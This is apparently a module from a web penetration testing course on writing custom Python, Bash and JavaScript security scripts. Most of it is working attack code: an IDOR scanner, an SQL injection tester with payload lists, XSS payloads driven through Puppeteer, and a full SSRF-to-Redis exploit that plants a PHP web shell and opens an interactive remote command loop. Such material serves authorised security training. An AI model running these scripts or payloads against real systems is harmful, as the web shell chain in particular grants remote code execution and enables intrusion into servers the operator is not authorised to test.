# Unit 12: Web Testing Tools - Topic 5: Custom Scripts

## Overview

Custom scripting is an essential skill for web penetration testers, enabling automation of repetitive tasks, exploitation of complex vulnerabilities, and creation of purpose-built tools. While off-the-shelf tools handle common scenarios, custom scripts are necessary for **chaining vulnerabilities**, **testing unique business logic**, **bypassing custom protections**, and **automating multi-step attacks**. Python is the dominant language for security scripting due to its extensive library ecosystem, but Bash, JavaScript, and Go are also commonly used.

---

## 1. Python for Web Security Testing

### Essential Libraries

| Library | Purpose | Install |
|---------|---------|---------|
| **requests** | HTTP requests | `pip install requests` |
| **beautifulsoup4** | HTML parsing | `pip install beautifulsoup4` |
| **lxml** | XML/HTML parsing | `pip install lxml` |
| **selenium** | Browser automation | `pip install selenium` |
| **aiohttp** | Async HTTP | `pip install aiohttp` |
| **pwntools** | Exploit development | `pip install pwntools` |
| **jwt** | JWT manipulation | `pip install PyJWT` |
| **cryptography** | Crypto operations | `pip install cryptography` |
| **paramiko** | SSH client | `pip install paramiko` |
| **scapy** | Packet crafting | `pip install scapy` |
| **colorama** | Colored output | `pip install colorama` |
| **argparse** | CLI arguments | Built-in |

### HTTP Request Templates

```python
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebTester:
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Common headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'application/json',
        })
    
    def authenticate(self, username, password):
        """Login and store session cookies"""
        resp = self.session.post(f'{self.base_url}/api/login', json={
            'username': username,
            'password': password
        })
        if resp.status_code == 200:
            token = resp.json().get('token')
            if token:
                self.session.headers['Authorization'] = f'Bearer {token}'
            print(f'[+] Authenticated as {username}')
            return True
        print(f'[-] Authentication failed: {resp.status_code}')
        return False
    
    def get(self, path, **kwargs):
        return self.session.get(f'{self.base_url}{path}', **kwargs)
    
    def post(self, path, **kwargs):
        return self.session.post(f'{self.base_url}{path}', **kwargs)

# Usage
tester = WebTester('http://target.com', proxy='http://127.0.0.1:8080')
tester.authenticate('admin', 'password')
response = tester.get('/api/users')
print(response.json())
```

---

## 2. Common Security Scripts

### IDOR Scanner

```python
#!/usr/bin/env python3
"""IDOR Scanner - Test for Insecure Direct Object References"""
import requests
import argparse
import json

def test_idor(base_url, endpoint, token_a, token_b, id_range):
    """
    Test if User B can access User A's resources
    """
    print(f"\n[*] Testing IDOR on: {endpoint}")
    print(f"[*] ID range: {id_range[0]} - {id_range[1]}")
    
    headers_a = {'Authorization': f'Bearer {token_a}'}
    headers_b = {'Authorization': f'Bearer {token_b}'}
    
    vulnerable = []
    
    for obj_id in range(id_range[0], id_range[1] + 1):
        url = f"{base_url}{endpoint.replace('{id}', str(obj_id))}"
        
        # First check if User A can access (should be allowed for their resources)
        resp_a = requests.get(url, headers=headers_a, verify=False)
        
        if resp_a.status_code == 200:
            # Now test if User B can also access User A's resource
            resp_b = requests.get(url, headers=headers_b, verify=False)
            
            if resp_b.status_code == 200:
                print(f"  [!] IDOR FOUND: ID {obj_id} accessible by both users!")
                vulnerable.append({
                    'id': obj_id,
                    'url': url,
                    'status': resp_b.status_code,
                    'response_length': len(resp_b.text)
                })
            else:
                print(f"  [✓] ID {obj_id} properly protected ({resp_b.status_code})")
    
    return vulnerable

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='IDOR Scanner')
    parser.add_argument('-u', '--url', required=True, help='Base URL')
    parser.add_argument('-e', '--endpoint', required=True, help='Endpoint with {id} placeholder')
    parser.add_argument('-a', '--token-a', required=True, help='User A token')
    parser.add_argument('-b', '--token-b', required=True, help='User B token')
    parser.add_argument('-r', '--range', default='1-100', help='ID range (e.g., 1-100)')
    args = parser.parse_args()
    
    id_start, id_end = map(int, args.range.split('-'))
    results = test_idor(args.url, args.endpoint, args.token_a, args.token_b, (id_start, id_end))
    
    if results:
        print(f"\n[!] Found {len(results)} IDOR vulnerabilities!")
        print(json.dumps(results, indent=2))
    else:
        print("\n[✓] No IDOR vulnerabilities found")
```

### Subdomain Enumerator

```python
#!/usr/bin/env python3
"""Subdomain Enumerator using DNS brute force"""
import dns.resolver
import concurrent.futures
import argparse

def check_subdomain(domain, subdomain):
    """Check if subdomain exists"""
    target = f"{subdomain}.{domain}"
    try:
        answers = dns.resolver.resolve(target, 'A')
        ips = [str(r) for r in answers]
        return target, ips
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, 
            dns.resolver.NoNameservers, dns.exception.Timeout):
        return None, None

def enumerate_subdomains(domain, wordlist_path, threads=50):
    """Enumerate subdomains using wordlist"""
    with open(wordlist_path, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    found = []
    print(f"[*] Testing {len(subdomains)} subdomains for {domain}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(check_subdomain, domain, sub): sub 
            for sub in subdomains
        }
        
        for future in concurrent.futures.as_completed(futures):
            target, ips = future.result()
            if target:
                print(f"  [+] {target} → {', '.join(ips)}")
                found.append({'subdomain': target, 'ips': ips})
    
    return found

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Subdomain Enumerator')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-w', '--wordlist', required=True)
    parser.add_argument('-t', '--threads', type=int, default=50)
    args = parser.parse_args()
    
    results = enumerate_subdomains(args.domain, args.wordlist, args.threads)
    print(f"\n[*] Found {len(results)} subdomains")
```

### SQL Injection Tester

```python
#!/usr/bin/env python3
"""Basic SQL Injection Detection Script"""
import requests
import re
import argparse

SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.*SQL[ -]*Server",
    r"OLE DB.*SQL Server",
    r"SQL Server.*Driver",
    r"Warning.*mssql_",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"Oracle.*Driver",
    r"Warning.*\Woci_",
    r"Warning.*\Wora_",
    r"ORA-\d{5}",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"SQLite\.Exception",
    r"SQLITE_ERROR",
]

SQLI_PAYLOADS = [
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=1",
    "1 AND 1=2",
]

def test_sqli(url, param, method='GET', data=None, cookies=None):
    """Test a parameter for SQL injection"""
    print(f"\n[*] Testing {param} on {url}")
    results = []
    
    for payload in SQLI_PAYLOADS:
        if method.upper() == 'GET':
            test_url = url.replace(f'{param}=', f'{param}={payload}')
            resp = requests.get(test_url, cookies=cookies, verify=False, timeout=15)
        else:
            test_data = data.copy() if data else {}
            test_data[param] = payload
            resp = requests.post(url, data=test_data, cookies=cookies, verify=False, timeout=15)
        
        # Check for SQL errors
        for pattern in SQL_ERRORS:
            if re.search(pattern, resp.text, re.IGNORECASE):
                print(f"  [!] SQL ERROR with payload: {payload}")
                print(f"      Pattern: {pattern}")
                results.append({
                    'payload': payload,
                    'pattern': pattern,
                    'type': 'error-based'
                })
                break
        
        # Check for time-based (if SLEEP payload)
        if 'SLEEP' in payload or 'WAITFOR' in payload:
            if resp.elapsed.total_seconds() > 4:
                print(f"  [!] TIME-BASED SQLi with payload: {payload}")
                print(f"      Response time: {resp.elapsed.total_seconds():.2f}s")
                results.append({
                    'payload': payload,
                    'response_time': resp.elapsed.total_seconds(),
                    'type': 'time-based'
                })
    
    return results
```

---

## 3. Bash One-Liners for Web Testing

### Quick Recon Scripts

```bash
# Extract all URLs from a page
curl -s http://target.com | grep -oP 'href="[^"]*"' | cut -d'"' -f2 | sort -u

# Find all JavaScript files
curl -s http://target.com | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2

# Check security headers
curl -s -D - http://target.com -o /dev/null | grep -iE "strict|x-frame|x-content|csp|x-xss"

# Quick subdomain enumeration
for sub in www mail admin dev staging api test; do
    host "$sub.target.com" 2>/dev/null | grep "has address" && echo "[+] $sub.target.com EXISTS"
done

# Directory brute force (simple)
while read dir; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/$dir")
    [ "$code" != "404" ] && echo "$code - /$dir"
done < wordlist.txt

# Test for common files
for file in robots.txt sitemap.xml .env .git/HEAD .htaccess wp-config.php; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/$file")
    [ "$code" = "200" ] && echo "[!] FOUND: /$file"
done

# Cookie flag check
curl -s -D - http://target.com -o /dev/null | grep -i "set-cookie" | while read line; do
    echo "$line"
    echo "$line" | grep -qi "httponly" || echo "  [!] Missing HttpOnly"
    echo "$line" | grep -qi "secure" || echo "  [!] Missing Secure"
    echo "$line" | grep -qi "samesite" || echo "  [!] Missing SameSite"
done

# Port scan with curl
for port in 80 443 8080 8443 3000 5000 8000 9090; do
    timeout 2 curl -s -o /dev/null "http://target.com:$port" 2>/dev/null && echo "[+] Port $port OPEN"
done
```

---

## 4. JavaScript/Node.js Security Scripts

### Puppeteer for Automated Browser Testing

```javascript
// Automated XSS testing with Puppeteer
const puppeteer = require('puppeteer');

async function testXSS(url, inputSelector, submitSelector) {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    
    const payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<svg onload=alert(1)>',
    ];
    
    // Listen for dialog boxes (alert/confirm/prompt)
    let xssTriggered = false;
    page.on('dialog', async dialog => {
        console.log(`[!] XSS TRIGGERED: ${dialog.message()}`);
        xssTriggered = true;
        await dialog.dismiss();
    });
    
    for (const payload of payloads) {
        xssTriggered = false;
        await page.goto(url, { waitUntil: 'networkidle2' });
        
        // Type payload into input
        await page.type(inputSelector, payload);
        
        // Submit form
        await page.click(submitSelector);
        await page.waitForTimeout(2000);
        
        if (xssTriggered) {
            console.log(`[!] VULNERABLE to payload: ${payload}`);
        } else {
            console.log(`[✓] Safe against: ${payload.substring(0, 30)}...`);
        }
    }
    
    await browser.close();
}

testXSS(
    'http://target.com/search',
    '#search-input',
    '#search-button'
);
```

---

## 5. Exploit Development Patterns

### Chained Vulnerability Exploitation

```python
#!/usr/bin/env python3
"""
Example: Chain SSRF → RCE exploitation
Step 1: Use SSRF to access internal Redis
Step 2: Write web shell via Redis
Step 3: Execute commands via web shell
"""
import requests
import urllib.parse
import time

TARGET = "http://target.com"
INTERNAL_REDIS = "127.0.0.1:6379"
WEBROOT = "/var/www/html"

def ssrf_request(url_to_fetch):
    """Exploit SSRF to make internal requests"""
    resp = requests.get(f"{TARGET}/api/fetch", params={
        'url': url_to_fetch
    }, verify=False)
    return resp

def exploit():
    print("[*] Stage 1: SSRF to access internal Redis")
    
    # Build gopher payload for Redis commands
    redis_commands = [
        "SET shell '<?php system($_GET[\"cmd\"]); ?>'",
        f"CONFIG SET dir {WEBROOT}",
        "CONFIG SET dbfilename shell.php",
        "SAVE"
    ]
    
    # Convert to gopher protocol format
    payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 2)
        payload += f"*{len(parts)}\r\n"
        for part in parts:
            payload += f"${len(part)}\r\n{part}\r\n"
    
    gopher_url = f"gopher://{INTERNAL_REDIS}/_{urllib.parse.quote(payload)}"
    
    print(f"[*] Sending gopher payload via SSRF...")
    resp = ssrf_request(gopher_url)
    print(f"[*] Redis response: {resp.text[:100]}")
    
    time.sleep(2)
    
    print("\n[*] Stage 2: Testing web shell")
    shell_url = f"{TARGET}/shell.php"
    resp = requests.get(shell_url, params={'cmd': 'id'}, verify=False)
    
    if resp.status_code == 200 and 'uid=' in resp.text:
        print(f"[+] RCE ACHIEVED! Output: {resp.text.strip()}")
        
        # Interactive shell
        while True:
            cmd = input("shell> ")
            if cmd.lower() in ('exit', 'quit'):
                break
            resp = requests.get(shell_url, params={'cmd': cmd}, verify=False)
            print(resp.text)
    else:
        print("[-] Web shell not accessible")

if __name__ == '__main__':
    exploit()
```

---

## 6. Script Organization Best Practices

### Project Structure

```
security-scripts/
├── recon/
│   ├── subdomain_enum.py
│   ├── port_scanner.py
│   ├── technology_fingerprint.py
│   └── js_endpoint_extract.py
├── scanners/
│   ├── idor_scanner.py
│   ├── sqli_tester.py
│   ├── xss_tester.py
│   ├── cors_checker.py
│   └── header_analyzer.py
├── exploits/
│   ├── ssrf_exploit.py
│   ├── jwt_forge.py
│   ├── race_condition.py
│   └── chain_exploit.py
├── utils/
│   ├── http_client.py      ← Shared HTTP session class
│   ├── payloads.py          ← Payload collections
│   ├── encoder.py           ← Encoding utilities
│   └── output.py            ← Report formatting
├── wordlists/
│   ├── directories.txt
│   ├── parameters.txt
│   └── subdomains.txt
├── requirements.txt
└── README.md
```

### Best Practices

| Practice | Description |
|----------|-------------|
| **Proxy support** | Always support Burp proxy (`--proxy` flag) |
| **Output formats** | Support JSON, CSV, and console output |
| **Error handling** | Graceful timeout/connection error handling |
| **Rate limiting** | Built-in delay between requests |
| **Logging** | Log all requests for reproducibility |
| **CLI arguments** | Use argparse for configurable parameters |
| **Session management** | Reuse HTTP sessions for performance |
| **Threading** | Use ThreadPoolExecutor for parallel requests |
| **SSL verification** | Option to disable SSL verification |
| **Color output** | Use colorama for readable terminal output |

---

## Summary Table

| Language | Best For | Key Libraries |
|----------|----------|---------------|
| **Python** | Full exploit scripts, automation | requests, beautifulsoup4, aiohttp |
| **Bash** | Quick one-liners, recon | curl, grep, sed, awk |
| **JavaScript** | Browser automation, DOM testing | Puppeteer, Playwright |
| **Go** | High-performance tools | net/http, goroutines |

---

## Revision Questions

1. Write a Python script that tests for IDOR vulnerabilities across a range of user IDs using two different authentication tokens.
2. How would you use Python's `requests` library with Burp Suite as a proxy? Why is this useful?
3. Describe how to chain SSRF and Redis to achieve Remote Code Execution. What tools/scripts would you use?
4. What are the essential components of a well-structured security testing script? List at least six best practices.
5. Write a Bash one-liner that checks all common security headers for a given URL.
6. How would you use Puppeteer/Playwright to automate XSS testing in a modern SPA?

---

*Previous: [04-automated-scanners.md](04-automated-scanners.md) | Next: [06-tool-chaining.md](06-tool-chaining.md)*

---

*[Back to README](../README.md)*
